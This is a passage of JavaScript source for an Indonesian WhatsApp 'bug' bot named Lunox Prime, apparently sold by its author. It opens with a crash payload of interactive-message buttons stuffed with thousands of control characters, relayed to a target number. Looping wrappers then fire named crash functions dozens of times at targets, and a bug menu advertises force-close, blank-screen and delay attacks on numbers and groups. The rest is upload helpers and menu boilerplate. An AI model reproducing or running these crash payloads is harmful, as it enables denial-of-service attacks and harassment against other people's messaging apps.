                { name: "wa_payment_transaction_details", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_fbpin_reset", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "catalog_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_info", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_order", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "send_location", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payments_care_csat", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "view_product", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_settings", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "address_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "automated_greeting_message_view_catalog", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "open_webview", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "message_with_link_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_costum", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "extensions_message_v2", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "landline_call", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "mpm", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_copy", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_url", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_and_pay", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_call", buttonParamsJson:  "\u0003".repeat(5000) }
              ]
            }
          }
        }
      }
    }, {});

    await client.relayMessage(target, messageContent.message, {
      messageId: messageContent.key.id,
      participant : { jid: target},
    });

    console.log(chalk.red(`Dah Sukses Bosku`));
  }
//BATAS FUNCTION
//PEMANGILAN FUNCTION
async function forcloselunox(target) {
  for (let i = 0; i < 40; i++) {
    await ForceInvisions(target);
    await sleep(600);
  }
}

async function blankhardlunox(target) {
  for (let i = 0; i < 30; i++) {
    await Killers(target);
    await sleep(500);
    await docthumb(target);
  }
}

async function delayhardlunox(target) {
  for (let i = 0; i < 50; i++) {
    await StellarBriliance(client, target, 'RAM');
    await sleep(500);
    await DelayCrashJembut(target);
    await sleep(500);
    await DileyHarddd(target);
  }
}

async function groubattackxnxx(target) {
  for (let i = 0; i < 80; i++) {
    await crashgrouplunox(target);
    await sleep(1000);
    await fuckgroupXnxx(target);
    await sleep(1000);
    await gsIntjavgb(target, true);
  }
}
//BATAS PEMANGILAN
let formData = require('form-data')
let { fromBuffer } = require('file-type')

async function TelegraPh (buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new formData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");

  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });

  let data = await res.text();
  return data;
}

async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new formData();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}

function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new formData()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const formDataThen = new formData()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  formDataThen.append('file', file)
			  formDataThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: formDataThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${formDataThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
				   resolve({
						status: true,
						message: "Xeorz",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}

async function floNime(medianya, options = {}) {
const { ext } = await fromBuffer(medianya) || options.ext
        var form = new formData()
        form.append('file', medianya, 'tmp.'+ext)
        let jsonnya = await fetch('https://flonime.my.id/upload', {
                method: 'POST',
                body: form
        })
        .then((response) => response.json())
        return jsonnya
}

        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = {
            client,
            prefix,
            command, 
            reply, 
            text, 
            isBot,
            reaction,
            pushname, 
            mime,
            quoted,
            sleep,
            fquoted,
            fetchJson 
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.isBot && !isBot) {
                    return
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(config.message.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  

        switch (command) {
          case "menu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `
🦅 — ( 𝘱𝘪𝘯𝘻𝘺𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 )
𝘭𝘢𝘶𝘵𝘢𝘯 𝘪𝘵𝘶 𝘥𝘢𝘭𝘢𝘮, 𝘵𝘦𝘳𝘪𝘮𝘢𝘬𝘢𝘴𝘪𝘩 𝘵𝘦𝘭𝘢𝘩
𝘮𝘦𝘯𝘪𝘭𝘢𝘪𝘬𝘶 𝘥𝘢𝘳𝘪 𝘱𝘦𝘳𝘮𝘶𝘬𝘢𝘢𝘯, 𝘢𝘬𝘢𝘯 𝘬𝘶
𝘣𝘶𝘬𝘵𝘪𝘬𝘢𝘯 𝘥𝘪 𝘩𝘢𝘳𝘪 𝘱𝘦𝘮𝘣𝘶𝘬𝘵𝘪𝘢𝘯

\`╔═══[ BOT STATUS ]════\`
\`║\` ✰ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
\`║\` ✰ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 1.0.0
\`║\` ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : PinzyOffc
\`║\` ▢ 𝘚𝘵𝘢𝘵𝘶𝘴 : Private Only
\`╚══════════════════\`

➤  ｢ 𝘒𝘭𝘪𝘬 𝘉𝘶𝘵𝘵𝘰𝘯 𝘜𝘯𝘵𝘶𝘬 𝘔𝘦𝘯𝘢𝘮𝘱𝘪𝘭𝘬𝘢𝘯 𝘚𝘦𝘮𝘶𝘢 𝘑𝘦𝘯𝘪𝘴 𝘍𝘪𝘵𝘶𝘳 𝘠𝘢𝘯𝘨 𝘛𝘦𝘳𝘴𝘦𝘥𝘪𝘢. ｣ 
`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "✅")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "TikTok @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "YT LunoxOfficial-ID",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
				    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘎𝘳𝘰𝘶𝘱𝘔𝘦𝘯𝘶",
                            id: `.groupmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;

          case "bugmenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘽𝙪𝙜𝙨
 │.𝘧𝘰𝘳𝘤𝘭𝘰𝘴𝘦-𝘤𝘢𝘭𝘭 628xxx
 │.𝘣𝘭𝘢𝘯𝘬-𝘩𝘢𝘳𝘥 62xxx
 │.𝘥𝘦𝘭𝘢𝘺-𝘴𝘸 62xxx
 │.𝘧𝘤-𝘩𝘢𝘳𝘥 62xxx
 │.𝘣𝘭𝘢𝘯𝘬-𝘴𝘵𝘶𝘤𝘬 62xxx
 ╰▢
 ╭▢ 𝘽𝙪𝙜𝙨 𝙄𝙣 𝙋𝙡𝙖𝙘𝙚
 │.hallo 628xxx
 │.p 628xxx
 ╰▢
 ╭▢ 𝘽𝙪𝙜 𝙂𝙧𝙤𝙪𝙥
 │.𝘤𝘰𝘮𝘣𝘰-𝘨𝘣 [𝘉𝘶𝘨 𝘋𝘪𝘵𝘦𝘮𝘱𝘢𝘵]
 │.𝘥𝘦𝘭𝘢𝘺-𝘨𝘣 [𝘉𝘶𝘨 𝘋𝘪𝘵𝘦𝘮𝘱𝘢𝘵]
 ╰▢`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "🦠")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
					{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘎𝘳𝘰𝘶𝘱𝘔𝘦𝘯𝘶",
                            id: `.groupmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦𝘵",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;      

          case "toolsmenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ *Tools Owner Menu*
 │.brat
 │.tiktok
 │.get
 │.swgroup
 │.cekidch
 │.capcut
 │.iqc
 │.rvo
 |.terlanjang
 │.mesinfo
 │.insp
 │.exec
 │.eval
 ╰▢`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "🔓")
    await sleep(1000);
    await reaction(m.chat, "🎮")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
				    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘎𝘳𝘰𝘶𝘱𝘔𝘦𝘯𝘶",
                            id: `.groupmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;
            
          case "ownermenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ *Owner Menu*
 │.addowner
 │.dellowner
 │.tagall
 │.self
 │.public
 │.afk
 │.unafk
 │.update
 │.clearsesi
 │.restart
 │.hapus-sampah
 ╰▢

➤  ｢ *INFO UPDATE SCRIPT* ｣ 
https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "📍")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
